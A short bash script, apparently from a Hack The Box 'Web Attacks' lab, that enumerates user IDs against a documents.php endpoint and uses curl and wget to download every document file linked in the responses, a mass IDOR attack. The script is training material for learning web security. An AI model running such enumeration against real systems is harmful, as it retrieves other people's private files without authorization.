#!/bin/bash

# This script is the edited version that hackthebox gives you to complete the mass IDOR enumeration sub-module within the Web Attacks module. The original script does not work. 

url="http://ip:port" # Edit this line

for i in {1..15}; do
        response=$(curl -s -X POST $url/documents.php -d "uid=$i")
        echo "Response for uid=$i: $response"
        
        for link in $(echo "$response" | grep -oP "/documents/[a-zA-Z0-9_]+\.txt"); do
                echo "Fetching: $url$link"
                wget -q "$url$link"
        done
done
